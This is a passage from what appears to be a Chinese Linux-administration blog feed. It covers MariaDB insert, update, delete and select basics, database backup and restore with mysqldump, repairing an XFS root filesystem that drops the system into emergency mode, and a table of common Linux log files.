href="#5-&#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;" class="headerlink" title="5 &#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;"></a>5 &#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;</h2><p>&#x63A5;&#x4E0B;&#x6765;&#x5411;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x63D2;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002;&#x4E3A;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;INSERT&#x547D;&#x4EE4;&#xFF0C;&#x5E76;&#x5728;&#x547D;&#x4EE4;&#x4E2D;&#x5199;&#x6E05;&#x8868;&#x5355;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x9879;&#x3002;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5373;&#x53EF;&#x5B8C;&#x6210;&#x56FE;&#x4E66;&#x5199;&#x5165;&#x4FE1;&#x606F;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x8BE5;&#x547D;&#x4EE4;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x4E66;&#x540D;&#x4E3A;jaking&#xFF0C;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x5206;&#x522B;&#x662F;60&#x5143;&#x548C;518&#x9875;&#x3002;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5199;&#x5165;&#x5230;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x60F3;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x661F;&#x53F7;&#xFF08;*&#xFF09;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#xFF1A;</p><pre><code class="sql">MariaDB [jaking]&gt; INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking&apos;,&apos;60&apos;, &apos;518&apos;);Query OK, 1 row affected (0.00 sec)MariaDB [jaking]&gt; select * from mybook;+------------+-------+-------+| name       | price | pages |+------------+-------+-------+| jaking |    60 |   518 |+------------+-------+-------+1 rows in set (0.01 sec)</code></pre><p>&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BB2;&#xFF0C;&#x9700;&#x8981;&#x505A;&#x597D;&#x56DB;&#x95E8;&#x529F;&#x8BFE;&#x2014;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#x5E76;&#x5728;&#x5176;&#x4E2D;&#x63D2;&#x5165;&#x5185;&#x5BB9;&#x4EC5;&#x4EC5;&#x662F;&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x638C;&#x63E1;&#x6570;&#x636E;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;update&#x547D;&#x4EE4;&#x5C06;&#x521A;&#x624D;&#x63D2;&#x5165;&#x7684;jaking&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;&#x4EF7;&#x683C;&#x4FEE;&#x6539;&#x4E3A;55&#x5143;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x8BE5;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#x4FE1;&#x606F;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x53EA;&#x67E5;&#x770B;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#xFF0C;&#x800C;&#x4E0D;&#x6D89;&#x53CA;&#x9875;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x987B;&#x518D;&#x7528;&#x661F;&#x53F7;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x3002;</p><pre><code class="sql">MariaDB [jaking]&gt; UPDATE mybook SET price=55 ;Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0MariaDB [jaking]&gt; SELECT name,price FROM mybook;+------------+-------+| name       | price |+------------+-------+| jaking |    55 |+------------+-------+1 row in set (0.00 sec)</code></pre><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x6570;&#x636E;&#x8868;&#x5355;mybook&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x8BE5;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8BE5;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x4E3A;&#x7A7A;&#x4E86;&#x3002;</p><pre><code class="sql">MariaDB [jaking]&gt; DELETE FROM mybook;Query OK, 1 row affected (0.01 sec)MariaDB [jaking]&gt; SELECT * FROM mybook;Empty set (0.00 sec)</code></pre><p>&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x4F1A;&#x5B58;&#x653E;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x6761;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;mybook&#x8868;&#x5355;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x7684;&#x63A8;&#x79FB;&#xFF0C;&#x91CC;&#x9762;&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EA;&#x60F3;&#x67E5;&#x770B;&#x5176;&#x4EF7;&#x683C;&#x5927;&#x4E8E;&#x67D0;&#x4E2A;&#x6570;&#x503C;&#x7684;&#x56FE;&#x4E66;&#x65F6;&#xFF0C;&#x53C8;&#x8BE5;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5462;&#xFF1F;<br>&#x4E0B;&#x9762;&#x5148;&#x4F7F;&#x7528;insert&#x63D2;&#x5165;&#x547D;&#x4EE4;&#x4F9D;&#x6B21;&#x63D2;&#x5165;4&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF1A;</p><pre><code class="sql">INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking1&apos;,&apos;30&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking2&apos;,&apos;50&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking3&apos;,&apos;80&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking4&apos;,&apos;100&apos;,&apos;518&apos;);</code></pre><p>&#x8981;&#x60F3;&#x8BA9;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x66F4;&#x52A0;&#x7CBE;&#x51C6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x7ED3;&#x5408;&#x4F7F;&#x7528;select&#x4E0E;where&#x547D;&#x4EE4;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#xFF0C;where&#x547D;&#x4EE4;&#x662F;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8FDB;&#x884C;&#x5339;&#x914D;&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6;&#x547D;&#x4EE4;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4EC5;&#x67E5;&#x627E;&#x51FA;&#x7B26;&#x5408;&#x8BE5;&#x6761;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x3002;&#x8868;3&#x5217;&#x51FA;&#x4E86;where&#x547D;&#x4EE4;&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x67E5;&#x8BE2;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#x3002;</p><p>&#x8868;3. where&#x547D;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;</p><table><thead><tr><th>&#x53C2;&#x6570;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>=</td><td>&#x76F8;&#x7B49;</td></tr><tr><td>&lt;&gt; &#x6216; !=</td><td>&#x4E0D;&#x76F8;&#x7B49;</td></tr><tr><td>&gt;</td><td>&#x5927;&#x4E8E;</td></tr><tr><td>&lt;</td><td>&#x5C0F;&#x4E8E;</td></tr><tr><td>&gt;=</td><td>&#x5927;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;</td></tr><tr><td>&lt;=</td><td>&#x5C0F;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;</td></tr><tr><td>BETWEEN</td><td>&#x5728;&#x67D0;&#x4E2A;&#x8303;&#x56F4;&#x5185;</td></tr><tr><td>LIKE</td><td>&#x641C;&#x7D22;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;</td></tr><tr><td>IN</td><td>&#x5728;&#x5217;&#x4E2D;&#x641C;&#x7D22;&#x591A;&#x4E2A;&#x503C;</td></tr></tbody></table><p>&#x73B0;&#x5728;&#x8FDB;&#x5165;&#x52A8;&#x624B;&#x73AF;&#x8282;&#x3002;&#x5206;&#x522B;&#x5728;mybook&#x8868;&#x5355;&#x4E2D;&#x67E5;&#x627E;&#x51FA;&#x4EF7;&#x683C;&#x5927;&#x4E8E;75&#x5143;&#x6216;&#x4EF7;&#x683C;&#x4E0D;&#x7B49;&#x4E8E;80&#x5143;&#x7684;&#x56FE;&#x4E66;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;&#x5728;&#x719F;&#x6089;&#x4E86;&#x8FD9;&#x4E24;&#x4E2A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x5C1D;&#x8BD5;&#x7CBE;&#x786E;&#x67E5;&#x627E;&#x56FE;&#x4E66;&#x540D;&#x4E3A;jaking2&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002;</p><pre><code class="sql">MariaDB [jaking]&gt; SELECT * FROM mybook WHERE price&gt;75;+-------------+-------+-------+| name        | price | pages |+-------------+-------+-------+| jaking3 |    80 |   518 || jaking4 |   100 |   518 |+-------------+-------+-------+2 rows in set (0.06 sec)MariaDB [jaking]&gt; SELECT * FROM mybook WHERE price!=80;+-------------+-------+-------+| name | price | pages        |+-------------+-------+-------+| jaking1  | 30  | 518    || jaking2  | 50  | 518    || jaking4  | 100 | 518    |+-------------+-------+-------+3 rows in set (0.01 sec)MariaDB [mysql]&gt; exitBye</code></pre><h2 id="6-&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;"><a href="#6-&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;" class="headerlink" title="6 &#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;"></a>6 &#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;</h2><p>&#x524D;&#x6587;&#x63D0;&#x5230;&#xFF0C;&#x672C;&#x4E66;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#x65B9;&#x5411;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x6DF1;&#x5165;&#x7684;&#x8BB2;&#x89E3;&#xFF0C;&#x56E0;&#x6B64;&#x5927;&#x5BB6;&#x638C;&#x63E1;&#x4E86;&#x4E0A;&#x9762;&#x8FD9;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5C31;&#x8DB3;&#x591F;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x8981;&#x8BB2;&#x89E3;&#x7684;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4EE5;&#x53CA;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x4E9B;&#x77E5;&#x8BC6;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#xFF0C;&#x5E0C;&#x671B;&#x5927;&#x5BB6;&#x80FD;&#x591F;&#x638C;&#x63E1;&#x3002;<br>mysqldump&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;mysqldump [&#x53C2;&#x6570;] [&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;]&#x201D;&#x3002;&#x5176;&#x4E2D;&#x53C2;&#x6570;&#x4E0E;mysql&#x547D;&#x4EE4;&#x5927;&#x81F4;&#x76F8;&#x540C;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#xFF0C;-p&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5BC6;&#x7801;&#x63D0;&#x793A;&#x7B26;&#x3002;&#x4E0B;&#x9762;&#x5C06;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x5BFC;&#x51FA;&#x6210;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x5B58;&#x5230;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#x4E2D;&#xFF1A;</p><pre><code>[root@jaking ~]# mysqldump -u root -p jaking &gt; /root/jakingDB.dumpEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</code></pre><p>&#x7136;&#x540E;&#x8FDB;&#x5165;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x5F7B;&#x5E95;&#x5220;&#x9664;jaking&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8FD9;&#x6837;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E5F;&#x5C06;&#x88AB;&#x5F7B;&#x5E95;&#x5220;&#x9664;&#x3002;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;jaking&#x6570;&#x636E;&#x5E93;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; DROP DATABASE jaking;Query OK, 1 row affected (0.04 sec)MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema |+--------------------+3 rows in set (0.02 sec)MariaDB [(none)]&gt; CREATE DATABASE jaking;Query OK, 1 row affected (0.00 sec)</code></pre><p>&#x63A5;&#x4E0B;&#x6765;&#x662F;&#x89C1;&#x8BC1;&#x6570;&#x636E;&#x6062;&#x590D;&#x6548;&#x679C;&#x7684;&#x65F6;&#x523B;&#xFF01;&#x4F7F;&#x7528;&#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#x7B26;&#x628A;&#x521A;&#x521A;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5230;mysql&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x767B;&#x5F55;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5C31;&#x53C8;&#x80FD;&#x770B;&#x5230;jaking&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E86;&#x3002;&#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;&#x6210;&#x529F;&#xFF01;</p><pre><code class="sql">[root@jaking ~]# mysql -u root -p jaking &lt; /root/jakingDB.dump Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;[root@jaking ~]# mysql -u root -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;MariaDB [(none)]&gt; use jaking;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [jaking]&gt; SHOW tables;+----------------------+| Tables_in_jaking |+----------------------+| mybook               |+----------------------+1 row in set (0.05 sec)MariaDB [jaking]&gt; DESCRIBE mybook;+-------+----------+------+-----+---------+-------+| Field | Type     | Null | Key | Default | Extra |+-------+----------+------+-----+---------+-------+| name  | char(15) | YES  |     | NULL    |       || price | int(11)  | YES  |     | NULL    |       || pages | int(11)  | YES  |     | NULL    |       |+-------+----------+------+-----+---------+-------+3 rows in set (0.02 sec)MariaDB [jaking]&gt; select * from mybook;+---------+-------+-------+| name    | price | pages |+---------+-------+-------+| jaking1 |    30 |   518 || jaking2 |    50 |   518 || jaking3 |    80 |   518 || jaking4 |   100 |   518 |+---------+-------+-------+4 rows in set (0.00 sec)MariaDB [jaking]&gt; </code></pre><p>&#x8865;&#x5145;&#xFF1A;</p><pre><code class="sql">create database jaking;use jaking;CREATE TABLE mybook (name char(15),price int,pages int);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking1&apos;,&apos;30&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking2&apos;,&apos;50&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking3&apos;,&apos;80&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking4&apos;,&apos;100&apos;,&apos;518&apos;);show tables;select * from mybook;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8FF0;&quot;&gt;&lt;a href=&quot;#&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8FF0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x7AE0;&amp;#x8282;&amp;#x7B80;&amp;#x8
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux无法挂载sysroot并自动进入紧急模式</title>
    <link href="https://marnm.github.io//posts/aabbd398/"/>
    <id>https://marnm.github.io//posts/aabbd398/</id>
    <published>2022-06-07T04:56:22.000Z</published>
    <updated>2022-06-07T04:58:45.589Z</updated>
    
    <content type="html"><![CDATA[<p>&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x673A;&#x4E4B;&#x540E;&#xFF1B;<br>&#x5982;&#x610F;&#x5916;&#x65AD;&#x7535;&#x4E4B;&#x540E;&#xFF0C;&#x4F7F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x72B6;&#x6001;&#xFF0C;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5F00;&#x673A;</p><p>&#x5F00;&#x673A;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x5165;&#x7D27;&#x6025;&#x6A21;&#x5F0F;&#xFF1A;<br><a id="more"></a><br><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072148052.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072149556.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150205.png" alt=""></p><p>&#x5F53;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C;&#x6302;&#x8F7D;&#x7684;<code>/sysroot</code>&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x4E0B;&#x9762;&#x7684;&#x62A5;&#x9519;&#xFF1A;</p><pre><code>mount: can&apos;t find /sysroot in /etc/fstab</code></pre><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150291.png" alt=""></p><p>&#x4F7F;&#x7528;<code>journalctl -xb</code>&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x62A5;&#x9519;&#x4FE1;&#x606F;</p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150012.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072150628.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151724.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151364.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151116.png" alt=""></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072151396.png" alt=""></p><p><strong>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</strong><br>&#x9700;&#x8981;&#x4F7F;&#x7528;<code>xfs_repair</code>&#x547D;&#x4EE4;&#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</p><pre><code class="shell">[sudo] xfs_repair -v /dev/dm-0# &#x6216;&#xFF1A;# -L&#x9009;&#x9879;&#x53EF;&#x80FD;&#x4F1A;&#x635F;&#x574F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;[sudo] xfs_repair -v -L /dev/dm-0</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果系统出现非正常关机之后；&lt;br&gt;如意外断电之后，使文件系统出现错误状态，导致系统无法正常开机&lt;/p&gt;
&lt;p&gt;开机后会自动进入紧急模式：&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux常见日志文件</title>
    <link href="https://marnm.github.io//posts/15c0e66c/"/>
    <id>https://marnm.github.io//posts/15c0e66c/</id>
    <published>2022-06-07T04:55:52.000Z</published>
    <updated>2022-06-07T04:59:10.380Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>/var/log/message</td><td>&#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6D88;&#x606F;&#x8BB0;&#x5F55;&#x5728;&#x6B64;&#x5904;&#x3002;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#x7684;&#xFF1A;&#x5982;&#x4E0E;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x5904;&#x7406;&#x76F8;&#x5173;&#x7684;&#x5B9A;&#x671F;&#x4F5C;&#x4E1A;&#x4EFB;&#x52A1;&#x7B49;</td></tr><tr><td>/var/log/secure</td><td>&#x5B89;&#x5168;&#x548C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x548C;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#x4EA7;&#x751F;&#x7684;&#x65E5;&#x5FD7;</td></tr><tr><td>/var/log/maillog</td><td>&#x4E0E;&#x90AE;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</td></tr><tr><td>/var/log/cron</td><td>&#x4E0E;&#x5B9A;&#x671F;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</td></tr><tr><td>/var/log/boot.log</td><td>&#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55;</td></tr><tr><td>/var/log/dmesg</td><td>&#x4E0E;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x76F8;&#x5173;&#x7684;&#x6D88;&#x606F;&#x8BB0;&#x5F55;</td></tr><tr><td>/var/log/wtmp</td><td>&#x8BE5;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x767B;&#x5F55;&#x6B21;&#x6570;&#x548C;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x53EF;&#x4EE5;&#x7528;last&#x547D;&#x4EE4;&#x67E5;&#x770B;wtmp&#x7684;&#x5185;&#x5BB9;&#x3002;</td></tr><tr><td>/var/log/btmp</td><td>&#x8BB0;&#x5F55;&#x9519;&#x8BEF;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x65E5;&#x5FD7;&#x3002;&#x53EF;&#x4EE5;&#x7528;lastb&#x547D;&#x4EE4;&#x67E5;&#x770B;</td></tr><tr><td></td><td></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = 